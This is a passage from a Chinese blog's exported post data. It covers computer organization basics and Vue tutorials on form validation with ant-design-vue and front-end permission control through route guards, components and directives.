参考\n\n极客时间——深入浅出计算机组成原理\n","slug":"2019-04-30-computer-organization-overview","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xi0064wovv7ysf73fk","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>编程好多年，越来越发现上层的应用技术日新月异，但是基本原理都是一样的。浮华之后，突然很想静下来好好梳理下底层的一些知识。作为开篇，先来个整体的知识地图，以后可以按图索骥，不断完善各个知识点。<br><img src=\"/2019-04-30-computer-organization-overview/0.jpg\" alt=\"计算机组成原理知识地图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"硬件设备组成\"><a href=\"#硬件设备组成\" class=\"headerlink\" title=\"硬件设备组成\"></a>硬件设备组成</h2><ol>\n<li>CPU：最核心配件，三大件之一，全名叫中央处理器（Central Processing Unit）。计算机的所有“计算”都是由 CPU 来进行的。</li>\n<li>内存：三大件之一，你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。</li>\n<li>主板：三大件之一，CPU 和内存及其他配件的载体。主板有很多插槽，可以放各种对应的配件。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。</li>\n<li>硬盘：外部存储设备。</li>\n<li>鼠标、键盘：输入设备；</li>\n<li>显示器：输出设备。<br>有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是使用还缺少输入输出设备（I/O 设备），加了这个才能输入指令，输出结果。</li>\n</ol>\n<p>另外还有一个很特殊的配件显卡（Graphics Card）。有内置显卡和独立显卡，如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。</p>\n<h2 id=\"冯·诺依曼体系结构\"><a href=\"#冯·诺依曼体系结构\" class=\"headerlink\" title=\"冯·诺依曼体系结构\"></a>冯·诺依曼体系结构</h2><p><img src=\"/2019-04-30-computer-organization-overview/1.jpg\" alt=\"冯·诺依曼体系结构\"><br>任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——深入浅出计算机组成原理</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>编程好多年，越来越发现上层的应用技术日新月异，但是基本原理都是一样的。浮华之后，突然很想静下来好好梳理下底层的一些知识。作为开篇，先来个整体的知识地图，以后可以按图索骥，不断完善各个知识点。<br><img src=\"/2019-04-30-computer-organization-overview/0.jpg\" alt=\"计算机组成原理知识地图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"硬件设备组成\"><a href=\"#硬件设备组成\" class=\"headerlink\" title=\"硬件设备组成\"></a>硬件设备组成</h2><ol>\n<li>CPU：最核心配件，三大件之一，全名叫中央处理器（Central Processing Unit）。计算机的所有“计算”都是由 CPU 来进行的。</li>\n<li>内存：三大件之一，你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。</li>\n<li>主板：三大件之一，CPU 和内存及其他配件的载体。主板有很多插槽，可以放各种对应的配件。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。</li>\n<li>硬盘：外部存储设备。</li>\n<li>鼠标、键盘：输入设备；</li>\n<li>显示器：输出设备。<br>有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是使用还缺少输入输出设备（I/O 设备），加了这个才能输入指令，输出结果。</li>\n</ol>\n<p>另外还有一个很特殊的配件显卡（Graphics Card）。有内置显卡和独立显卡，如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。</p>\n<h2 id=\"冯·诺依曼体系结构\"><a href=\"#冯·诺依曼体系结构\" class=\"headerlink\" title=\"冯·诺依曼体系结构\"></a>冯·诺依曼体系结构</h2><p><img src=\"/2019-04-30-computer-organization-overview/1.jpg\" alt=\"冯·诺依曼体系结构\"><br>任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——深入浅出计算机组成原理</p>"},{"title":"Vue实战@表单校验","date":"2019-05-24T01:31:44.000Z","updated":"2019-05-24T01:31:44.000Z","_content":"\n# 概述\n\n表单校验很重要，分为自定义校验和动态校验。自定义校验就是自己去监听值变化来改变 dom 显示样式。动态校验就是利用框架封装的校验规则去使用。本次以 ant-design-vue 组件库中使用为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义校验\n\n要点就是自己主动监听表单项的变化，然后对应的去修改 UI 组件暴露的属性值，通过不同值来显示不同的状态（错误、警告、成功等），例如 ant-design-vue 主要是控制 validate-status 和 help 两个属性，前者对应显示样式，后者对应提示文案。示例如下：\n\n```html\n<a-form-item label=\"用户名\" :validate-status=\"fieldAStatus\" :help=\"fieldAHelp\">\n  <a-input placeholder=\"用户名\" v-model=\"fieldA\" />\n</a-form-item>\n```\n\n```js\nmethods: {\n  submitHandle() {\n    if (this.fieldA.length < 6) {\n      this.fieldAStatus = \"error\";\n      this.fieldAHelp = \"不能小于6个字符\";\n    } else {\n      this.fieldAStatus = \"\";\n      this.fieldAHelp = \"\";\n    }\n  }\n}\n```\n\n## 动态校验\n\n要点就是按照使用的 UI 组件库规则来编写代码就可以了。例如 ant-design-vue，示例如下：\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\">\n      <a-form-item label=\"付款账户\">\n        <a-input\n          v-decorator=\"['payAccount',{rules: [{required: true, message: '请输入付款账号'}]}]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"check\">下一步</a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  export default {\n    data() {\n      return {\n        form: this.$form.createForm(this)\n      };\n    },\n    methods: {\n      check() {\n        this.form.validateFields(err => {\n          if (!err) {\n            console.info(\"success\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-ValidForm.md","raw":"---\ntitle: Vue实战@表单校验\npermalink: vue-in-action-ValidForm\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-24 09:31:44\nupdated: 2019-05-24 09:31:44\n---\n\n# 概述\n\n表单校验很重要，分为自定义校验和动态校验。自定义校验就是自己去监听值变化来改变 dom 显示样式。动态校验就是利用框架封装的校验规则去使用。本次以 ant-design-vue 组件库中使用为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义校验\n\n要点就是自己主动监听表单项的变化，然后对应的去修改 UI 组件暴露的属性值，通过不同值来显示不同的状态（错误、警告、成功等），例如 ant-design-vue 主要是控制 validate-status 和 help 两个属性，前者对应显示样式，后者对应提示文案。示例如下：\n\n```html\n<a-form-item label=\"用户名\" :validate-status=\"fieldAStatus\" :help=\"fieldAHelp\">\n  <a-input placeholder=\"用户名\" v-model=\"fieldA\" />\n</a-form-item>\n```\n\n```js\nmethods: {\n  submitHandle() {\n    if (this.fieldA.length < 6) {\n      this.fieldAStatus = \"error\";\n      this.fieldAHelp = \"不能小于6个字符\";\n    } else {\n      this.fieldAStatus = \"\";\n      this.fieldAHelp = \"\";\n    }\n  }\n}\n```\n\n## 动态校验\n\n要点就是按照使用的 UI 组件库规则来编写代码就可以了。例如 ant-design-vue，示例如下：\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\">\n      <a-form-item label=\"付款账户\">\n        <a-input\n          v-decorator=\"['payAccount',{rules: [{required: true, message: '请输入付款账号'}]}]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"check\">下一步</a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  export default {\n    data() {\n      return {\n        form: this.$form.createForm(this)\n      };\n    },\n    methods: {\n      check() {\n        this.form.validateFields(err => {\n          if (!err) {\n            console.info(\"success\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-ValidForm","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xj0068wovvtvs23j12","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>表单校验很重要，分为自定义校验和动态校验。自定义校验就是自己去监听值变化来改变 dom 显示样式。动态校验就是利用框架封装的校验规则去使用。本次以 ant-design-vue 组件库中使用为例。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自定义校验\"><a href=\"#自定义校验\" class=\"headerlink\" title=\"自定义校验\"></a>自定义校验</h2><p>要点就是自己主动监听表单项的变化，然后对应的去修改 UI 组件暴露的属性值，通过不同值来显示不同的状态（错误、警告、成功等），例如 ant-design-vue 主要是控制 validate-status 和 help 两个属性，前者对应显示样式，后者对应提示文案。示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a-form-item</span> <span class=\"attr\">label</span>=<span class=\"string\">\"用户名\"</span> <span class=\"attr\">:validate-status</span>=<span class=\"string\">\"fieldAStatus\"</span> <span class=\"attr\">:help</span>=<span class=\"string\">\"fieldAHelp\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a-input</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"用户名\"</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"fieldA\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">methods: &#123;</span><br><span class=\"line\">  submitHandle() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.fieldA.length &lt; <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAStatus = <span class=\"string\">\"error\"</span>;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAHelp = <span class=\"string\">\"不能小于6个字符\"</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAStatus = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAHelp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态校验\"><a href=\"#动态校验\" class=\"headerlink\" title=\"动态校验\"></a>动态校验</h2><p>要点就是按照使用的 UI 组件库规则来编写代码就可以了。例如 ant-design-vue，示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-form</span> <span class=\"attr\">:form</span>=<span class=\"string\">\"form\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span> <span class=\"attr\">label</span>=<span class=\"string\">\"付款账户\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"['payAccount',&#123;rules: [&#123;required: true, message: '请输入付款账号'&#125;]&#125;]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"check\"</span>&gt;</span>下一步<span class=\"tag\">&lt;/<span class=\"name\">a-button</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      check() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.form.validateFields(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.info(<span class=\"string\">\"success\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>表单校验很重要，分为自定义校验和动态校验。自定义校验就是自己去监听值变化来改变 dom 显示样式。动态校验就是利用框架封装的校验规则去使用。本次以 ant-design-vue 组件库中使用为例。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自定义校验\"><a href=\"#自定义校验\" class=\"headerlink\" title=\"自定义校验\"></a>自定义校验</h2><p>要点就是自己主动监听表单项的变化，然后对应的去修改 UI 组件暴露的属性值，通过不同值来显示不同的状态（错误、警告、成功等），例如 ant-design-vue 主要是控制 validate-status 和 help 两个属性，前者对应显示样式，后者对应提示文案。示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a-form-item</span> <span class=\"attr\">label</span>=<span class=\"string\">\"用户名\"</span> <span class=\"attr\">:validate-status</span>=<span class=\"string\">\"fieldAStatus\"</span> <span class=\"attr\">:help</span>=<span class=\"string\">\"fieldAHelp\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a-input</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"用户名\"</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"fieldA\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">methods: &#123;</span><br><span class=\"line\">  submitHandle() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.fieldA.length &lt; <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAStatus = <span class=\"string\">\"error\"</span>;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAHelp = <span class=\"string\">\"不能小于6个字符\"</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAStatus = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.fieldAHelp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态校验\"><a href=\"#动态校验\" class=\"headerlink\" title=\"动态校验\"></a>动态校验</h2><p>要点就是按照使用的 UI 组件库规则来编写代码就可以了。例如 ant-design-vue，示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-form</span> <span class=\"attr\">:form</span>=<span class=\"string\">\"form\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span> <span class=\"attr\">label</span>=<span class=\"string\">\"付款账户\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"['payAccount',&#123;rules: [&#123;required: true, message: '请输入付款账号'&#125;]&#125;]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"check\"</span>&gt;</span>下一步<span class=\"tag\">&lt;/<span class=\"name\">a-button</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      check() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.form.validateFields(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.info(<span class=\"string\">\"success\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@权限控制","date":"2019-05-21T08:55:07.000Z","updated":"2019-05-21T08:55:07.000Z","_content":"\n# 概述\n\n在管理系统中权限控制是一个必不可少的组成部分，包括路由控制，菜单控制，内容区控制等。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由控制\n\n### 辅助函数\n\n首先可以在项目想创建 utils 文件夹，然后创建 auth.js 文件，编写需要的功能函数。\n\n```js\nexport function getCurrentAuthority() {\n  // 后端返回用户角色\n  return [\"user\"];\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n### 导航守卫\n\n配置路由导航守卫，控制前端路由跳转。\n\n```js\nrouter.beforeEach((to, from, next) => {\n  if (to.path !== from.path) {\n    NProgress.start();\n  }\n  const record = findLast(to.matched, item => item.meta.authority);\n  if (record && !check(record.meta.authority)) {\n    if (!isLogin() && to.path !== \"/user/login\") {\n      next({\n        path: \"/user/login\"\n      });\n    } else if (to.path !== \"/403\") {\n      notification.error({\n        message: \"403\",\n        description: \"你没有权限访问，请联系管理员咨询。\"\n      });\n      next({\n        path: \"/403\"\n      });\n    }\n    NProgress.done();\n  }\n  next();\n});\n\nrouter.afterEach(() => {\n  NProgress.done();\n});\n```\n\n## 菜单控制\n\n思路就是判断权限，过滤显示菜单内容。例如基于之前动态生成菜单的实现方式，可以如下处理：\n\n```js\nlet menuData = [];\nfor (let element of routes) {\n  if (\n    element.meta &&\n    element.meta.authority &&\n    !check(element.meta.authority)\n  ) {\n    break;\n  }\n  ...\n  return menuData;\n}\n```\n\n## 精细化权限控制\n\n### 权限组件\n\n首选创建一个组件`Authorized.vue`，这里用函数式组件比较合适：\n\n```js\n<script>\nimport { check } from \"../utils/auth\";\nexport default {\n  // 指定该组件为函数式组件\n  functional: true,\n  props: {\n    authority: {\n      type: Array,\n      required: true\n    }\n  },\n  render(h, context) {\n    const { props, scopedSlots } = context;\n    return check(props.authority) ? scopedSlots.default() : null;\n  }\n};\n</script>\n```\n\n然后注册组件，推荐全局注册：\n\n```js\nimport Authorized from \"./components/Authorized\";\nVue.component(\"Authorized\", Authorized);\n```\n\n最后就可以在具体页面中使用了：\n\n```html\n<Authorized :authority=\"['admin']\">\n  <div>我是只有admin权限的用户才能看到的内容模块</div>\n</Authorized>\n```\n\n### 权限指令\n\n首先创建一个指令插件 `auth.js`：\n\n```js\nimport { check } from \"../utils/auth\";\n// 提供install方法（语法）\nfunction install(Vue, options = {}) {\n  // 定义指令\n  Vue.directive(options.name || \"auth\", {\n    // 钩子函数\n    inserted(el, binding) {\n      if (!check(binding.value)) {\n        el.parentNode && el.parentNode.removeChild(el);\n      }\n    }\n  });\n}\n\nexport default { install };\n```\n\n然后全局注册插件：\n\n```js\nimport Auth from \"./directives/auth\";\nVue.use(Auth);\n```\n\n最后就可以在需要的元素上使用该指令了：\n\n```html\n<a-icon\n  v-auth=\"['admin']\"\n  class=\"trigger\"\n  :type=\"collapsed ? 'menu-unfold' : 'menu-fold'\"\n  @click=\"foldHandler\"\n/>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n","source":"_posts/2019/05/vue-in-action-auth.md","raw":"---\ntitle: Vue实战@权限控制\npermalink: vue-in-action-auth\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-21 16:55:07\nupdated: 2019-05-21 16:55:07\n---\n\n# 概述\n\n在管理系统中权限控制是一个必不可少的组成部分，包括路由控制，菜单控制，内容区控制等。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由控制\n\n### 辅助函数\n\n首先可以在项目想创建 utils 文件夹，然后创建 auth.js 文件，编写需要的功能函数。\n\n```js\nexport function getCurrentAuthority() {\n  // 后端返回用户角色\n  return [\"user\"];\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n### 导航守卫\n\n配置路由导航守卫，控制前端路由跳转。\n\n```js\nrouter.beforeEach((to, from, next) => {\n  if (to.path !== from.path) {\n    NProgress.start();\n  }\n  const record = findLast(to.matched, item => item.meta.authority);\n  if (record && !check(record.meta.authority)) {\n    if (!isLogin() && to.path !== \"/user/login\") {\n      next({\n        path: \"/user/login\"\n      });\n    } else if (to.path !== \"/403\") {\n      